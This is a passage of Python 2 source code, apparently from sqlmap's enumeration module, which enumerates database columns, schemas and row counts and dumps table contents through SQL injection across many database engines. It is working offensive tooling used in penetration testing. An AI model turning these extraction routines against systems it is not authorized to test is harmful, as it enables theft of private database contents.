            if len(kb.data.cachedTables) > 0:
                if conf.db in kb.data.cachedTables:
                    tblList = kb.data.cachedTables[conf.db]
                else:
                    tblList = kb.data.cachedTables.values()

                if isinstance(tblList[0], (set, tuple, list)):
                    tblList = tblList[0]
            else:
                errMsg = "unable to retrieve the tables"
                errMsg += "on database '%s'" % conf.db
                raise sqlmapNoneDataException, errMsg

        for tbl in tblList:
            tblList[tblList.index(tbl)] = safeSQLIdentificatorNaming(tbl, True)

        if bruteForce is None:
            if Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:
                errMsg = "information_schema not available, "
                errMsg += "back-end DBMS is MySQL < 5.0"
                logger.error(errMsg)
                bruteForce = True

            elif Backend.isDbms(DBMS.ACCESS):
                errMsg = "cannot retrieve column names, "
                errMsg += "back-end DBMS is Access"
                logger.error(errMsg)
                bruteForce = True

        if bruteForce:
            resumeAvailable = False

            for tbl in tblList:
                for db, table, colName, colType in kb.brute.columns:
                    if db == conf.db and table == tbl:
                        resumeAvailable = True
                        break

            if resumeAvailable or colList:
                columns = {}

                for column in colList:
                    columns[column] = None

                for tbl in tblList:
                    for db, table, colName, colType in kb.brute.columns:
                        if db == conf.db and table == tbl:
                            columns[colName] = colType

                    if conf.db in kb.data.cachedColumns:
                        kb.data.cachedColumns[safeSQLIdentificatorNaming(conf.db)][safeSQLIdentificatorNaming(tbl, True)] = columns
                    else:
                        kb.data.cachedColumns[safeSQLIdentificatorNaming(conf.db)] = {safeSQLIdentificatorNaming(tbl, True): columns}

                return kb.data.cachedColumns

            message = "do you want to use common columns existence check? [Y/n/q]"
            test = readInput(message, default="Y")

            if test[0] in ("n", "N"):
                return
            elif test[0] in ("q", "Q"):
                raise sqlmapUserQuitException
            else:
                return columnExists(paths.COMMON_COLUMNS)

        rootQuery = queries[Backend.getIdentifiedDbms()].columns
        condition = rootQuery.blind.condition if 'condition' in rootQuery.blind else None

        if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR)) or conf.direct:
            for tbl in tblList:
                if conf.db is not None and len(kb.data.cachedColumns) > 0 \
                   and conf.db in kb.data.cachedColumns and tbl in \
                   kb.data.cachedColumns[conf.db]:
                    infoMsg = "fetched tables' columns on "
                    infoMsg += "database '%s'" % conf.db
                    logger.info(infoMsg)

                    return { conf.db: kb.data.cachedColumns[conf.db]}

                infoMsg = "fetching columns "

                if len(colList) > 0:
                    if colTuple is None:
                        colConsider, colCondParam = self.likeOrExact("column")
                    else:
                        colConsider, colCondParam = colTuple
                    condQueryStr = "%%s%s" % colCondParam
                    condQuery = " AND (%s)" % " OR ".join(condQueryStr % (condition, unsafeSQLIdentificatorNaming(col)) for col in sorted(colList))

                    if colConsider == "1":
                        infoMsg += "LIKE '%s' " % ", ".join(unsafeSQLIdentificatorNaming(col) for col in sorted(colList))
                    else:
                        infoMsg += "'%s' " % ", ".join(unsafeSQLIdentificatorNaming(col) for col in sorted(colList))
                else:
                    condQuery = ""

                infoMsg += "for table '%s' " % tbl
                infoMsg += "on database '%s'" % conf.db
                logger.info(infoMsg)

                if Backend.getIdentifiedDbms() in ( DBMS.MYSQL, DBMS.PGSQL ):
                    query = rootQuery.inband.query % (unsafeSQLIdentificatorNaming(tbl), unsafeSQLIdentificatorNaming(conf.db))
                    query += condQuery
                elif Backend.getIdentifiedDbms() in ( DBMS.ORACLE, DBMS.DB2):
                    query = rootQuery.inband.query % unsafeSQLIdentificatorNaming(tbl.upper())
                    query += condQuery
                elif Backend.isDbms(DBMS.MSSQL):
                    query = rootQuery.inband.query % (conf.db, conf.db, conf.db, conf.db,
                                                      conf.db, conf.db, conf.db, unsafeSQLIdentificatorNaming(tbl))
                    query += condQuery.replace("[DB]", conf.db)
                elif Backend.isDbms(DBMS.SQLITE):
                    query = rootQuery.inband.query % tbl

                value = inject.getValue(query, blind=False)

                if Backend.isDbms(DBMS.SQLITE):
                    parseSqliteTableSchema(value)
                elif not isNoneValue(value):
                    table = {}
                    columns = {}

                    for columnData in value:
                        if not isNoneValue(columnData):
                            name = safeSQLIdentificatorNaming(columnData[0])

                            if name:
                                if len(columnData) == 1:
                                    columns[name] = ""
                                else:
                                    columns[name] = columnData[1]

                    if conf.db in kb.data.cachedColumns:
                        kb.data.cachedColumns[safeSQLIdentificatorNaming(conf.db)][safeSQLIdentificatorNaming(tbl, True)] = columns
                    else:
                        table[safeSQLIdentificatorNaming(tbl, True)] = columns
                        kb.data.cachedColumns[safeSQLIdentificatorNaming(conf.db)] = table

        if not kb.data.cachedColumns and isInferenceAvailable() and not conf.direct:
            for tbl in tblList:
                if conf.db is not None and len(kb.data.cachedColumns) > 0 \
                   and conf.db in kb.data.cachedColumns and tbl in \
                   kb.data.cachedColumns[conf.db]:
                    infoMsg = "fetched tables' columns on "
                    infoMsg += "database '%s'" % conf.db
                    logger.info(infoMsg)

                    return { conf.db: kb.data.cachedColumns[conf.db]}

                infoMsg = "fetching columns "

                if len(colList) > 0:
                    if colTuple is None:
                        colConsider, colCondParam = self.likeOrExact("column")
                    else:
                        colConsider, colCondParam = colTuple
                    condQueryStr = "%%s%s" % colCondParam
                    condQuery = " AND (%s)" % " OR ".join(condQueryStr % (condition, unsafeSQLIdentificatorNaming(col)) for col in sorted(colList))

                    if colConsider == "1":
                        infoMsg += "LIKE '%s' " % ", ".join(unsafeSQLIdentificatorNaming(col) for col in sorted(colList))
                    else:
                        infoMsg += "'%s' " % ", ".join(unsafeSQLIdentificatorNaming(col) for col in sorted(colList))
                else:
                    condQuery = ""

                infoMsg += "for table '%s' " % tbl
                infoMsg += "on database '%s'" % conf.db
                logger.info(infoMsg)

                if Backend.getIdentifiedDbms() in ( DBMS.MYSQL, DBMS.PGSQL ):
                    query = rootQuery.blind.count % (unsafeSQLIdentificatorNaming(tbl), unsafeSQLIdentificatorNaming(conf.db))
                    query += condQuery

                elif Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2):
                    query = rootQuery.blind.count % unsafeSQLIdentificatorNaming(tbl.upper())
                    query += condQuery

                elif Backend.getIdentifiedDbms() in DBMS.MSSQL:
                    query = rootQuery.blind.count % (conf.db, conf.db, \
                        unsafeSQLIdentificatorNaming(tbl))
                    query += condQuery.replace("[DB]", conf.db)

                elif Backend.isDbms(DBMS.FIREBIRD):
                    query = rootQuery.blind.count % (tbl)
                    query += condQuery

                elif Backend.isDbms(DBMS.SQLITE):
                    query = rootQuery.blind.query % tbl
                    value = inject.getValue(query, inband=False, error=False)
                    parseSqliteTableSchema(value)
                    return kb.data.cachedColumns

                count = inject.getValue(query, inband=False, error=False, expected=EXPECTED.INT, charsetType=2)

                if not isNumPosStrValue(count):
                    errMsg = "unable to retrieve the number of columns "
                    errMsg += "for table '%s' " % tbl
                    errMsg += "on database '%s'" % conf.db
                    logger.error(errMsg)

                    continue

                table = {}
                columns = {}

                indexRange = getRange(count)

                for index in indexRange:
                    if Backend.getIdentifiedDbms() in ( DBMS.MYSQL, DBMS.PGSQL ):
                        query = rootQuery.blind.query % (unsafeSQLIdentificatorNaming(tbl), unsafeSQLIdentificatorNaming(conf.db))
                        query += condQuery
                        field = None
                    elif Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2):
                        query = rootQuery.blind.query % unsafeSQLIdentificatorNaming(tbl.upper())
                        query += condQuery
                        field = None
                    elif Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):
                        query = rootQuery.blind.query % (conf.db, conf.db, conf.db, conf.db,
                                                         conf.db, conf.db, unsafeSQLIdentificatorNaming(tbl))
                        query += condQuery.replace("[DB]", conf.db)
                        field = condition.replace("[DB]", conf.db)
                    elif Backend.isDbms(DBMS.FIREBIRD):
                        query = rootQuery.blind.query % (tbl)
                        query += condQuery
                        field = None

                    query = agent.limitQuery(index, query, field)
                    column = inject.getValue(query, inband=False, error=False)

                    if not isNoneValue(column):
                        if not onlyColNames:
                            if Backend.getIdentifiedDbms() in ( DBMS.MYSQL, DBMS.PGSQL ):
                                query = rootQuery.blind.query2 % (unsafeSQLIdentificatorNaming(tbl), column, unsafeSQLIdentificatorNaming(conf.db))
                            elif Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2):
                                query = rootQuery.blind.query2 % (unsafeSQLIdentificatorNaming(tbl.upper()), column)
                            elif Backend.isDbms(DBMS.MSSQL):
                                query = rootQuery.blind.query2 % (conf.db, conf.db, conf.db, conf.db, column, conf.db,
                                                                conf.db, conf.db, unsafeSQLIdentificatorNaming(tbl))
                            elif Backend.isDbms(DBMS.FIREBIRD):
                                query = rootQuery.blind.query2 % (tbl, column)

                            colType = inject.getValue(query, inband=False, error=False)

                            if Backend.isDbms(DBMS.FIREBIRD):
                                colType = firebirdTypes.get(colType, colType)

                            column = safeSQLIdentificatorNaming(column)
                            columns[column] = colType
                        else:
                            column = safeSQLIdentificatorNaming(column)
                            columns[column] = None

                if columns:
                    if conf.db in kb.data.cachedColumns:
                        kb.data.cachedColumns[safeSQLIdentificatorNaming(conf.db)][safeSQLIdentificatorNaming(tbl, True)] = columns
                    else:
                        table[safeSQLIdentificatorNaming(tbl, True)] = columns
                        kb.data.cachedColumns[safeSQLIdentificatorNaming(conf.db)] = table

        if not kb.data.cachedColumns:
            errMsg = "unable to retrieve the columns for any "
            errMsg += "table on database '%s'" % conf.db
            logger.error(errMsg)

            if bruteForce is None:
                return self.getColumns(onlyColNames=onlyColNames, colTuple=colTuple, bruteForce=True)

        return kb.data.cachedColumns

    def getSchema(self):
        infoMsg = "enumerating database management system schema"
        logger.info(infoMsg)

        pushValue(conf.db)
        pushValue(conf.tbl)
        pushValue(conf.col)

        conf.db = None
        conf.tbl = None
        conf.col = None
        kb.data.cachedTables = {}
        kb.data.cachedColumns = {}

        self.getTables()

        infoMsg = "fetched tables: "
        infoMsg += ", ".join(["%s" % ", ".join("%s%s%s" % (unsafeSQLIdentificatorNaming(db), ".." if \
                   Backend.isDbms(DBMS.MSSQL) or Backend.isDbms(DBMS.SYBASE) \
                   else ".", unsafeSQLIdentificatorNaming(t)) for t in tbl) for db, tbl in \
                   kb.data.cachedTables.items()])
        logger.info(infoMsg)

        for db, tables in kb.data.cachedTables.items():
            for tbl in tables:
                conf.db = db
                conf.tbl = tbl

                self.getColumns()

        conf.col = popValue()
        conf.tbl = popValue()
        conf.db = popValue()

        return kb.data.cachedColumns

    def __tableGetCount(self, db, table):
        if Backend.isDbms(DBMS.DB2):
            query = "SELECT %s FROM %s.%s--" % (queries[Backend.getIdentifiedDbms()].count.query % '*', safeSQLIdentificatorNaming(db.upper()), safeSQLIdentificatorNaming(table.upper(), True))
        else:
            query = "SELECT %s FROM %s.%s" % (queries[Backend.getIdentifiedDbms()].count.query % '*', safeSQLIdentificatorNaming(db), safeSQLIdentificatorNaming(table, True))

        count = inject.getValue(query, expected=EXPECTED.INT, charsetType=2)

        if count is not None and isinstance(count, basestring) and count.isdigit():
            if safeSQLIdentificatorNaming(db) not in kb.data.cachedCounts:
                kb.data.cachedCounts[safeSQLIdentificatorNaming(db)] = {}

            if int(count) in kb.data.cachedCounts[safeSQLIdentificatorNaming(db)]:
                kb.data.cachedCounts[safeSQLIdentificatorNaming(db)][int(count)].append(safeSQLIdentificatorNaming(table, True))
            else:
                kb.data.cachedCounts[safeSQLIdentificatorNaming(db)][int(count)] = [safeSQLIdentificatorNaming(table, True)]

    def getCount(self):
        if not conf.tbl:
            warnMsg = "missing table parameter, sqlmap will retrieve "
            warnMsg += "the number of entries for all database "
            warnMsg += "management system databases' tables"
            logger.warn(warnMsg)

        elif "." in conf.tbl:
            if not conf.db:
                conf.db, conf.tbl = conf.tbl.split(".")

        if conf.tbl is not None and conf.db is None:
            warnMsg = "missing database parameter, sqlmap is going to "
            warnMsg += "use the current database to retrieve the "
            warnMsg += "number of entries for table '%s'" % conf.tbl
            logger.warn(warnMsg)

            conf.db = self.getCurrentDb()

        self.forceDbmsEnum()

        if conf.tbl:
            for table in conf.tbl.split(","):
                self.__tableGetCount(conf.db, table)
        else:
            self.getTables()

            for db, tables in kb.data.cachedTables.items():
                for table in tables:
                    self.__tableGetCount(db, table)

        return kb.data.cachedCounts

    def __pivotDumpTable(self, table, colList, count=None, blind=True):
        lengths = {}
        entries = {}

        dumpNode = queries[Backend.getIdentifiedDbms()].dump_table.blind

        validColumnList = False
        validPivotValue = False

        if not count:
            query = dumpNode.count % table
            count = inject.getValue(query, inband=False, error=False) if blind else inject.getValue(query, blind=False)

        if count == "0":
            infoMsg = "table '%s' appears to be empty" % table
            logger.info(infoMsg)

            for column in colList:
                lengths[column] = len(column)
                entries[column] = []

            return entries, lengths

        elif isNoneValue(count):
            return None

        for column in colList:
            lengths[column] = 0
            entries[column] = BigArray()

        colList = filter(None, sorted(colList, key=lambda x: len(x) if x else MAX_INT))

        for column in colList:
            infoMsg = "fetching number of distinct "
            infoMsg += "values for column '%s'" % column
            logger.info(infoMsg)

            query = dumpNode.count2 % (column, table)

            if blind:
                value = inject.getValue(query, inband=False, error=False)
            else:
                value = inject.getValue(query, blind=False)

            if isNumPosStrValue(value):
                validColumnList = True

                if value == count:
                    infoMsg = "using column '%s' as a pivot " % column
                    infoMsg += "for retrieving row data"
                    logger.info(infoMsg)

                    validPivotValue = True

                    colList.remove(column)
                    colList.insert(0, column)
                    break

        if not validColumnList:
            errMsg = "all column name(s) provided are non-existent"
            raise sqlmapNoneDataException, errMsg

        if not validPivotValue:
            warnMsg = "no proper pivot column provided (with unique values)." 
            warnMsg += " It's not possible to retrieve all rows."
            logger.warn(warnMsg)

        pivotValue = " "
        breakRetrieval = False

        try:
            for i in xrange(int(count)):
                if breakRetrieval:
                    break

                for column in colList:
                    # Correction for pivotValues with unrecognized/problematic chars
                    for char in ('\'', '?'):
                        if pivotValue and char in pivotValue and pivotValue[0] != char:
                            pivotValue = pivotValue.split(char)[0]
                            pivotValue = pivotValue[:-1] + chr(ord(pivotValue[-1]) + 1)
                            break
                    if column == colList[0]:
                        query = dumpNode.query % (column, table, column, pivotValue)
                    else:
                        query = dumpNode.query2 % (column, table, colList[0], pivotValue)

                    if blind:
                        value = inject.getValue(query, inband=False, error=False)
                    else:
                        value = inject.getValue(query, blind=False)

                    if column == colList[0]:
                        if isNoneValue(value) or not value:
                            breakRetrieval = True
                            break
                        else:
                            pivotValue = safechardecode(value)

                    if conf.limitStart or conf.limitStop:
                        if conf.limitStart and (i + 1) < conf.limitStart:
                            warnMsg  = "skipping first %d pivot " % conf.limitStart
                            warnMsg += "point values"
                            singleTimeWarnMessage(warnMsg)
                            break
                        elif conf.limitStop and (i + 1) > conf.limitStop:
                            breakRetrieval = True
                            break

                    value = "" if isNoneValue(value) else value

                    lengths[column] = max(lengths[column], len(value) if value else 0)
                    entries[column].append(value)

        except KeyboardInterrupt:
            warnMsg = "user aborted during enumeration. sqlmap "
            warnMsg += "will display partial output"
            logger.warn(warnMsg)

        except sqlmapConnectionException, e:
            errMsg = "connection exception detected. sqlmap "
            errMsg += "will display partial output"
            errMsg += "'%s'" % e
            logger.critical(errMsg)

        return entries, lengths

    def dumpTable(self, foundData=None):
        self.forceDbmsEnum()

        if conf.db is None or conf.db == "CD":
            if conf.db is None:
                warnMsg = "missing database parameter, sqlmap is going "
                warnMsg += "to use the current database to enumerate "
                warnMsg += "table(s) entries"
                logger.warn(warnMsg)

            conf.db = self.getCurrentDb()

        elif conf.db is not None:
            if Backend.isDbms(DBMS.ORACLE):
                conf.db = conf.db.upper()

            if  ',' in conf.db:
                errMsg = "only one database name is allowed when enumerating "
                errMsg += "the tables' columns"
                raise sqlmapMissingMandatoryOptionException, errMsg

        conf.db = safeSQLIdentificatorNaming(conf.db)

        if conf.tbl:
            if Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2):
                conf.tbl = conf.tbl.upper()

            tblList = conf.tbl.split(",")
        else:
            self.getTables()

            if len(kb.data.cachedTables) > 0:
                tblList = kb.data.cachedTables.values()

                if isinstance(tblList[0], (set, tuple, list)):
                    tblList = tblList[0]
            else:
                errMsg = "unable to retrieve the tables"
                errMsg += "on database '%s'" % conf.db
                raise sqlmapNoneDataException, errMsg

        for tbl in tblList:
            tblList[tblList.index(tbl)] = safeSQLIdentificatorNaming(tbl, True)

        for tbl in tblList:
            conf.tbl = tbl
            kb.data.dumpedTable = {}


            if foundData is None:
                kb.data.cachedColumns = {}
                self.getColumns(onlyColNames=True)
            else:
                kb.data.cachedColumns = foundData

            try:
                kb.dumpMode = True

                if not safeSQLIdentificatorNaming(conf.db) in kb.data.cachedColumns \
                   or safeSQLIdentificatorNaming(tbl, True) not in \
                   kb.data.cachedColumns[safeSQLIdentificatorNaming(conf.db)] \
                   or not kb.data.cachedColumns[safeSQLIdentificatorNaming(conf.db)][safeSQLIdentificatorNaming(tbl, True)]:
                    warnMsg = "unable to enumerate the columns for table "
                    warnMsg += "'%s' on database" % unsafeSQLIdentificatorNaming(tbl)
                    warnMsg += " '%s'" % unsafeSQLIdentificatorNaming(conf.db)
                    warnMsg += ", skipping" if len(tblList) > 1 else ""
                    logger.warn(warnMsg)

                    continue

                colList = sorted(filter(None, kb.data.cachedColumns[safeSQLIdentificatorNaming(conf.db)][safeSQLIdentificatorNaming(tbl, True)].keys()))
                colString = ", ".join(column for column in colList)
                rootQuery = queries[Backend.getIdentifiedDbms()].dump_table

                infoMsg = "fetching entries"
                if conf.col:
                    infoMsg += " of column(s) '%s'" % colString
                infoMsg += " for table '%s'" % unsafeSQLIdentificatorNaming(tbl)
                infoMsg += " on database '%s'" % unsafeSQLIdentificatorNaming(conf.db)
                logger.info(infoMsg)

                entriesCount = 0

                if any([isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION), isTechniqueAvailable(PAYLOAD.TECHNIQUE.ERROR), conf.direct]):
                    entries = []
                    query = None

                    if all([Backend.isDbms(DBMS.MYSQL), isTechniqueAvailable(PAYLOAD.TECHNIQUE.ERROR), conf.groupConcat]):
                        randStr, randStr2 = randomStr(), randomStr()
                        filterFunction = "REPLACE(REPLACE(IFNULL(%s, ' '),'%s','%s'),'%s','%s')"\
                          % ('%s', CONCAT_VALUE_DELIMITER, randStr, CONCAT_ROW_DELIMITER, randStr2)
                        concats = ",".join("CONCAT(%s, '|')" % (filterFunction % _) for _ in colList[:-1])
                        concats += ",%s" % (filterFunction % colList[-1])
                        query = "SELECT GROUP_CONCAT(%s) FROM %s.%s" % (concats, conf.db, tbl)
                        value = inject.getValue(query, blind=False)
                        if isinstance(value, basestring):
                            for line in value.split(CONCAT_ROW_DELIMITER):
                                row = line.split(CONCAT_VALUE_DELIMITER)
                                row = map(lambda x: x.replace(randStr, CONCAT_VALUE_DELIMITER).replace(randStr2, CONCAT_ROW_DELIMITER), row)
                                entries.append(row)

                    if Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2):
                        query = rootQuery.inband.query % (colString, tbl.upper() if not conf.db else ("%s.%s" % (conf.db.upper(), tbl.upper())))
                    elif Backend.getIdentifiedDbms() in (DBMS.SQLITE, DBMS.ACCESS, DBMS.FIREBIRD, DBMS.MAXDB):
                        query = rootQuery.inband.query % (colString, tbl)
                    elif Backend.getIdentifiedDbms() in (DBMS.SYBASE, DBMS.MSSQL):
                        # Partial inband and error
                        if not (isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION) and kb.injection.data[PAYLOAD.TECHNIQUE.UNION].where == PAYLOAD.WHERE.ORIGINAL):
                            table = "%s.%s" % (conf.db, tbl)

                            retVal = self.__pivotDumpTable(table, colList, blind=False)

                            if retVal:
                                entries, _ = retVal
                                entries = zip(*[entries[colName] for colName in colList])
                        else:
                            query = rootQuery.inband.query % (colString, conf.db, tbl)
                    elif Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                        query = rootQuery.inband.query % (colString, conf.db, tbl, sorted(colList, key=len)[0])
                    else:
                        query = rootQuery.inband.query % (colString, conf.db, tbl)

                    if not entries and query:
                        entries = inject.getValue(query, blind=False, dump=True)

                    if isNoneValue(entries):
                        entries = []
                    elif isinstance(entries, basestring):
                        entries = [ entries ]
                    elif not isinstance(entries, (list, tuple)):
                        entries = []

                    entriesCount = len(entries)
                    index = 0

                    for column in colList:
                        colLen = len(column)

                        if not kb.data.dumpedTable.has_key(column):
                            kb.data.dumpedTable[column] = { "length": colLen, "values": [] }

                        for entry in entries:
                            if entry is None or len(entry) == 0:
                                continue

                            if isinstance(entry, basestring):
                                colEntry = entry
                            else:
                                colEntry = entry[index] if index < len(entry) else u''

                            colEntryLen = len(getUnicode(colEntry))
                            maxLen = max(colLen, colEntryLen)

                            if maxLen > kb.data.dumpedTable[column]["length"]:
                                kb.data.dumpedTable[column]["length"] = maxLen

                            kb.data.dumpedTable[column]["values"].append(colEntry)

                        index += 1

                if not kb.data.dumpedTable and isInferenceAvailable() and not conf.direct:
                    infoMsg = "fetching number of "
                    if conf.col:
                        infoMsg += "column(s) '%s' " % colString
                    infoMsg += "entries for table '%s' " % unsafeSQLIdentificatorNaming(tbl)
                    infoMsg += "on database '%s'" % unsafeSQLIdentificatorNaming(conf.db)
                    logger.info(infoMsg)

                    if Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2):
                        query = rootQuery.blind.count % (tbl.upper() if not conf.db else ("%s.%s" % (conf.db.upper(), tbl.upper())))
                    elif Backend.getIdentifiedDbms() in (DBMS.SQLITE, DBMS.ACCESS, DBMS.FIREBIRD):
                        query = rootQuery.blind.count % tbl
                    elif Backend.getIdentifiedDbms() in (DBMS.SYBASE, DBMS.MSSQL):
                        query = rootQuery.blind.count % ("%s.%s" % (conf.db, tbl))
                    elif Backend.isDbms(DBMS.MAXDB):
                        query = rootQuery.blind.count % tbl
                    else:
                        query = rootQuery.blind.count % (conf.db, tbl)
                    count = inject.getValue(query, inband=False, error=False, expected=EXPECTED.INT, charsetType=2)

                    lengths = {}
                    entries = {}

                    if count == "0":
                        warnMsg  = "table '%s' " % unsafeSQLIdentificatorNaming(tbl)
                        warnMsg += "on database '%s' " % unsafeSQLIdentificatorNaming(conf.db)
                        warnMsg += "appears to be empty"
                        logger.warn(warnMsg)

                        for column in colList:
                            lengths[column] = len(column)
                            entries[column] = []

                    elif not isNumPosStrValue(count):
                        warnMsg = "unable to retrieve the number of "
                        if conf.col:
                            warnMsg += "column(s) '%s' " % colString
                        warnMsg += "entries for table '%s' " % unsafeSQLIdentificatorNaming(tbl)
                        warnMsg += "on database '%s'" % unsafeSQLIdentificatorNaming(conf.db)
                        logger.warn(warnMsg)

                        continue

                    elif Backend.getIdentifiedDbms() in (DBMS.ACCESS, DBMS.SYBASE, DBMS.MAXDB, DBMS.MSSQL):
                        if Backend.isDbms(DBMS.ACCESS):
                            table = tbl
                        elif Backend.getIdentifiedDbms() in (DBMS.SYBASE, DBMS.MSSQL):
                            table = "%s.%s" % (conf.db, tbl)
                        elif Backend.isDbms(DBMS.MAXDB):
                            table = "%s.%s" % (conf.db, tbl)

                        retVal = self.__pivotDumpTable(table, colList, count, blind=True)
                        if retVal:
                            entries, lengths = retVal

                    else:
                        if Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2):
                            plusOne = True
                        else:
                            plusOne = False
                        indexRange = getRange(count, dump=True, plusOne=plusOne)

                        try:
                            for index in indexRange:
                                for column in colList:
                                    if column not in lengths:
                                        lengths[column] = 0

                                    if column not in entries:
                                        entries[column] = BigArray()

                                    if Backend.getIdentifiedDbms() in ( DBMS.MYSQL, DBMS.PGSQL ):
                                        query = rootQuery.blind.query % (column, conf.db, conf.tbl, sorted(colList, key=len)[0], index)
                                    elif Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2):
                                        query = rootQuery.blind.query % (column, column,
                                                                        tbl.upper() if not conf.db else ("%s.%s" % (conf.db.upper(), tbl.upper())),
                                                                        index)
                                    elif Backend.isDbms(DBMS.SQLITE):
                                        query = rootQuery.blind.query % (column, tbl, index)

                                    elif Backend.isDbms(DBMS.FIREBIRD):
                                        query = rootQuery.blind.query % (index, column, tbl)

                                    value = inject.getValue(query, inband=False, error=False, dump=True)

                                    lengths[column] = max(lengths[column], len(value) if value else 0)
                                    entries[column].append(value)

                        except KeyboardInterrupt:
                            clearConsoleLine()
                            warnMsg = "Ctrl+C detected in dumping phase"
                            logger.warn(warnMsg)

                    for column, columnEntries in entries.items():
                        length = max(lengths[column], len(column))

                        kb.data.dumpedTable[column] = { "length": length, "values": columnEntries }

                        entriesCount = len(columnEntries)

                if len(kb.data.dumpedTable) > 0:
                    kb.data.dumpedTable["__infos__"] = { "count": entriesCount,
                                                         "table": safeSQLIdentificatorNaming(tbl, True),
                                                         "db":    safeSQLIdentificatorNaming(conf.db) }

                    attackDumpedTable()
                    conf.dumper.dbTableValues(kb.data.dumpedTable)
                else:
                    warnMsg = "unable to retrieve the entries of "
                    if conf.col:
                        warnMsg += "columns '%s' " % colString
                    warnMsg += "for table '%s' " % unsafeSQLIdentificatorNaming(tbl)
                    warnMsg += "on database '%s'" % unsafeSQLIdentificatorNaming(conf.db)
                    logger.warn(warnMsg)

            except sqlmapConnectionException, e:
                errMsg = "connection exception detected in dumping phase: "
                errMsg += "'%s'" % e
                logger.critical(errMsg)

            finally:
                kb.dumpMode = False

    def dumpAll(self):
        if conf.db is not None and conf.tbl is None:
            self.dumpTable()
            return

        if Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:
            errMsg = "information_schema not available, "
            errMsg += "back-end DBMS is MySQL < 5.0"
            raise sqlmapUnsupportedFeatureException, errMsg

        infoMsg = "sqlmap will dump entries of all databases' tables now"
        logger.info(infoMsg)

        conf.tbl = None
        conf.col = None

        self.getTables()

        if kb.data.cachedTables:
            if isinstance(kb.data.cachedTables, list):
                kb.data.cachedTables = { None : kb.data.cachedTables }

            for db, tables in kb.data.cachedTables.items():
                conf.db = db

                for table in tables:
                    try:
                        conf.tbl = table
                        kb.data.cachedColumns = {}
                        kb.data.dumpedTable = {}

                        self.dumpTable()
                    except sqlmapNoneDataException:
                        infoMsg = "skipping table '%s'" % table
                        logger.info(infoMsg)

    def dumpFoundColumn(self, dbs, foundCols, colConsider):
        if not dbs:
            warnMsg = "no databases have tables containing any of the "
            warnMsg += "provided columns"
            logger.warn(warnMsg)
            return

        conf.dumper.dbColumns(foundCols, colConsider, dbs)

        message = "do you want to dump entries? [Y/n] "
        output = readInput(message, default="Y")

        if output and output[0] not in ("y", "Y"):
            return

        dumpFromDbs = []
        message = "which database(s)?\n[a]ll (default)\n"

        for db, tblData in dbs.items():
            if tblData:
                message += "[%s]\n" % db

        message += "[q]uit"
        test = readInput(message, default="a")

        if not test or test in ("a", "A"):
            dumpFromDbs = dbs.keys()
        elif test in ("q", "Q"):
            return
        else:
            dumpFromDbs = test.replace(" ", "").split(",")

        for db, tblData in dbs.items():
            if db not in dumpFromDbs or not tblData:
                continue

            conf.db = db
            dumpFromTbls = []
            message = "which table(s) of database '%s'?\n" % db
            message += "[a]ll (default)\n"

            for tbl in tblData:
                message += "[%s]\n" % tbl

            message += "[s]kip\n"
            message += "[q]uit"
            test = readInput(message, default="a")

            if not test or test in ("a", "A"):
                dumpFromTbls = tblData
            elif test in ("s", "S"):
                continue
            elif test in ("q", "Q"):
                return
            else:
                dumpFromTbls = test.replace(" ", "").split(",")

            for table, columns in tblData.items():
                if table not in dumpFromTbls:
                    continue

                conf.tbl = table
                conf.col = ",".join(column for column in filter(None, sorted(columns)))
                kb.data.cachedColumns = {}
                kb.data.dumpedTable = {}

                data = self.dumpTable(dbs)

                if data:
                    conf.dumper.dbTableValues(data)

    def searchDb(self):
        foundDbs = []
        rootQuery = queries[Backend.getIdentifiedDbms()].search_db
        dbList = conf.db.split(",")

        if Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:
            dbCond = rootQuery.inband.condition2
        else:
            dbCond = rootQuery.inband.condition

        dbConsider, dbCondParam = self.likeOrExact("database")

        for db in dbList:
            db = safeSQLIdentificatorNaming(db)

            if Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2):
                db = db.upper()

            infoMsg = "searching database"
            if dbConsider == "1":
                infoMsg += "s like"
            infoMsg += " '%s'" % unsafeSQLIdentificatorNaming(db)
            logger.info(infoMsg)

            if conf.excludeSysDbs:
                exclDbsQuery = "".join(" AND '%s' != %s" % (unsafeSQLIdentificatorNaming(db), dbCond) for db in self.excludeDbsList)
                infoMsg = "skipping system database%s '%s'" % ("s" if len(self.excludeDbsList) > 1 else "", ", ".join(db for db in self.excludeDbsList))
                logger.info(infoMsg)
            else:
                exclDbsQuery = ""

            dbQuery = "%s%s" % (dbCond, dbCondParam)
            dbQuery = dbQuery % unsafeSQLIdentificatorNaming(db)

            if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR)) or conf.direct:
                if Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:
                    query = rootQuery.inband.query2
                else:
                    query = rootQuery.inband.query
                query += dbQuery
                query += exclDbsQuery
                values = inject.getValue(query, blind=False)

                if not isNoneValue(values):
                    if isinstance(values, basestring):
                        values = [ values ]

                    for value in values:
                        value = safeSQLIdentificatorNaming(value)
                        foundDbs.append(value)
            else:
                infoMsg = "fetching number of databases"
                if dbConsider == "1":
                    infoMsg += "s like"
                infoMsg += " '%s'" % unsafeSQLIdentificatorNaming(db)
                logger.info(infoMsg)

                if Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:
                    query = rootQuery.blind.count2
                else:
                    query = rootQuery.blind.count
                query += dbQuery
                query += exclDbsQuery
